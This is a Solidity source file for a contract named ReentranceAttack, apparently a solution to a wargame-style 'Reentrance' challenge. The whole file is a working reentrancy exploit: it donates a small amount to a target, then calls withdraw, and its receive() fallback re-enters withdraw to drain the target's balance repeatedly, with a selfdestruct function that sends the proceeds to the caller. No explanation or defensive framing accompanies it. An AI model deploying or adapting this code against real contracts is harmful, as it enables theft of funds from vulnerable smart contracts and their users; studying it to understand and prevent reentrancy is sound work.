// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address) external payable;

    function withdraw(uint256) external;

    function balanceOf(address) external view returns (uint256);
}

contract ReentranceAttack {
    constructor() public payable {}

    function toDonate(address _targetContractAddress) public {
        IReentrance reentrance = IReentrance(_targetContractAddress);
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function attack(address _targetContractAddress) public {
        IReentrance reentrance = IReentrance(_targetContractAddress);
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    receive() external payable {
        // re-entrance withdraw()
        IReentrance reentrance = IReentrance(msg.sender);
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    function destroyContract() public payable {
        selfdestruct(msg.sender);
    }
}
